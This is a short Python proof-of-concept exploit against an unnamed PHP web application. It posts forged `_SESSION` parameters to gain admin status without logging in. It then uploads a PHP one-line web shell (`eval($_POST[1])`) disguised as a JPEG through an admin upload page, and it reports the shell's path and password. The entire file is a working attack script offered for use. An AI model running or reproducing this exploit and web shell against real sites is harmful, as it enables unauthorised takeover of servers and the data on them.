#!/usr/bin/env python		
#coding:utf-8

import requests
import urlparse
import re

payload1 = {
	'_SESSION[login_in]':1,
	'_SESSION[admin]':1,
	'_SESSION[login_time]':'99999999999'
	}

def fixurl(url):
	if url.startswith('http://') or url.startswith('https://'):
		return url 
	else:
		url = 'http://'+url
		return url

def poc(url):
	#获取session
	url = fixurl(url)
	t = urlparse.urlparse(url)
	url1 = t.scheme+'://'+t.netloc+'/index.php'
	s = requests.session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
	try:
		s.post(url,data=payload1,headers=headers,timeout=3)
	except:
		return False

	# 文件上传
	url2 = t.scheme+'://'+t.netloc+'/admin/upload.php'
	data = {
		'thumb_width':300,
		'thumb_height':300,
		'submit':'submit',
		'get':None

	}
	files = {'up':('1.php','<?php @eval($_POST[1]);?>','image/jpeg')}
	try:
		res = s.post(url2,files=files,data=data,headers=headers,timeout=3)
		shell_path = re.findall("val\('(.*?)'\)",res.content)
		#print shell_path[0]
		if shell_path:
			return '[*]shell:'+url+'/upload/'+shell_path[0]+ '  [password:1]'
		else:
			return False

	except:
		return False




if __name__ == '__main__':
	poc('http://localhost/')